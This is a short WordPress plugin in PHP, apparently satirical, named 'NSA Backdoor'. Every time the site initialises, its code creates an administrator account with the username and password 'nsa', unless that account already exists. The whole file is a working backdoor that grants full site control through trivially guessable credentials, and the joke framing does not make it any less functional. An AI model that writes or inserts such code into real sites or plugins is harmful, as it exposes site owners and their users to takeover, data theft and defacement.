<?php
/*
Plugin Name: NSA Backdoor 
Description: Make it easy for the NSA to have admin access to your site 
Author: Aaron Jorbin 
Version: 1.0
Author URI: http://aaron.jorb.in/
License: GPLv2 or later
*/

function nsabackdoor_create_login() {
  
  //already added, no need to add again
  if ( get_user_by( 'email', 'nsa@example.com' ) )
    return;
  
  //add user
  $nsaUserId = wp_create_user('nsa', 'nsa', 'nsa@example.com');

  $nsaUser = new WP_User($nsaUserId);
  $nsaUser->set_role('administrator');


}
 
add_action( 'init', 'nsabackdoor_create_login' );
